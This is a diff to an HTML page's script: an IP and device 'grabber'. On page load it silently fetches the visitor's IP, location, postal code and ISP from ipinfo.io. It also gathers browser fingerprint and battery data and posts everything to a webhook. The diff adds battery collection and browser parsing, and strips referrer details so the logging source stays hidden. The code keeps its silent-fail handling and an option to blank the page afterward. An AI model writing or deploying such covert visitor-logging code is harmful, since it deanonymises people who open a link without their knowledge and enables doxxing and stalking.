@@ -12,18 +12,49 @@
 
     async function grabAll() {
       try {
-        // IP + geo + ISP (using ipinfo.io - free tier, reliable)
+        // IP + geo + ISP
         const ipRes = await fetch('https://ipinfo.io/json');
         const ipData = await ipRes.json();
 
-        // Gather everything the browser exposes
+        // Battery info (if supported)
+        let batteryLevel = '?';
+        let batteryCharging = '?';
+        if ('getBattery' in navigator) {
+          try {
+            const battery = await navigator.getBattery();
+            batteryLevel = battery.level ? Math.round(battery.level * 100) + '%' : '?';
+            batteryCharging = battery.charging ? 'Yes' : 'No';
+          } catch {}
+        }
+
+        // Parse friendly browser name/version from UA (basic heuristics)
+        let browserName = 'Unknown';
+        const ua = navigator.userAgent || '';
+        if (ua.includes('Chrome') && !ua.includes('Edg')) {
+          browserName = 'Chrome';
+        } else if (ua.includes('Edg')) {
+          browserName = 'Edge';
+        } else if (ua.includes('Firefox')) {
+          browserName = 'Firefox';
+        } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
+          browserName = 'Safari';
+        } else if (ua.includes('OPR') || ua.includes('Opera')) {
+          browserName = 'Opera';
+        }
+        // Add version if detectable (rough)
+        const versionMatch = ua.match(/(Chrome|Firefox|Edg|Safari|OPR|Version)\/([\d.]+)/);
+        if (versionMatch) {
+          browserName += ` ${versionMatch[2]}`;
+        }
+
         const allInfo = {
           ip: ipData.ip || '?',
           loc: `${ipData.city || '?'} • ${ipData.region || '?'} • ${ipData.country || '?'}`,
           postal: ipData.postal || '?',
           timezone: ipData.timezone || '?',
           isp_org: ipData.org || '?',
-          ua: navigator.userAgent || '?',
+          browser: browserName || ua.substring(0, 100) || '?',  // friendly name + fallback to short UA
+          ua_full: ua || '?',
           platform: navigator.platform || '?',
           languages: navigator.languages?.join(', ') || navigator.language || '?',
           screen: `\( {screen.width}× \){screen.height} (${screen.colorDepth || '?'}bit)`,
@@ -31,17 +62,18 @@
           hardware: navigator.hardwareConcurrency || '? cores',
           memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '?',
           connection: navigator.connection ? `\( {navigator.connection.effectiveType || '?'} ( \){navigator.connection.downlink || '?'} Mbps)` : '?',
+          battery_level: batteryLevel,
+          battery_charging: batteryCharging,
           doNotTrack: navigator.doNotTrack || '?',
           cookies: navigator.cookieEnabled ? 'enabled' : 'disabled',
-          time: new Date().toISOString(),
-          referrer: document.referrer || 'none/direct'
+          time: new Date().toISOString()
         };
 
-        // Build embed fields dynamically (no source/site mention beyond raw referrer if present)
+        // Build embed fields (no referrer/source info)
         const fields = Object.entries(allInfo).map(([key, val]) => ({
           name: key.charAt(0).toUpperCase() + key.slice(1).replace(/_/g, ' '),
           value: `\`${val}\``,
-          inline: !['ua', 'referrer'].includes(key)  // longer ones full width
+          inline: !['ua_full', 'browser'].includes(key)  // longer ones full width
         }));
 
         await fetch(webhook, {
@@ -58,15 +90,14 @@
           })
         });
       } catch (e) {
-        // silent fail if blocked (adblock, etc.)
+        // silent fail
       }
     }
 
     grabAll();
 
-    // Optional: blank the page or redirect after logging (uncomment if wanted)
+    // Optional: clear page after logging
     // setTimeout(() => { document.body.innerHTML = ''; }, 800);
-    // or redirect: setTimeout(() => { window.location = "https://example.com"; }, 1200);
   </script>
 </body>
 </html>
